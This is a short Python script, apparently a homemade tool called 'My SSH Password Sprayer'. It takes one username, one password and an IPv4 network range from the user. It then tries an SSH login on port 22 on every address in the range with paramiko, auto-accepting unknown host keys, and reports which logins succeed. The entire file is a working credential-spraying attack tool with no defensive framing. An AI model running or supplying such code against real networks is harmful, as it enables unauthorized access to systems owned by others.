import socket
import paramiko
import ipaddress
from ipaddress import IPv4Address, IPv4Network

print("-"*40)
print("Welcome to My SSH Password Sprayer")
print("-"*40)
username = input("Enter username: ").strip()
password = input("Enter password: ").strip()
iprange = input("Enter range to spray against: ").strip()
usr = username.strip()
pswd = password.strip()
port = 22
#str(iprange)
scanrange = IPv4Network(iprange)
targets = scanrange
string = "You are running a password spray with username '{}' and password '{}' against netblock {}."
output = string.format(username,password,iprange)
print(output)
print("-"*40)
print("Spraying...")
iprange2 = str(scanrange)
for ip in ipaddress.IPv4Network(iprange2):
    print("IP: %s" % (ip))
    try:
        ip2 = str(ip)
        ssh = paramiko.SSHClient()
        ssh.load_system_host_keys()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip2, port=22, username=usr, password=pswd)
        print("\033[92mlogin successful - %s:%s@%s\033[0m" % (username, password, ip))
        ssh.close()
    except paramiko.AuthenticationException:
        print("\033[91mAuthentication failed: %s\033[0m" % (ip))
        ssh.close()
    except:
        print("\033[33mCould not SSH to %s\033[0m" % (ip))
        ssh.close()
print("-"*40)
print("Spray done!")
print("-"*40)

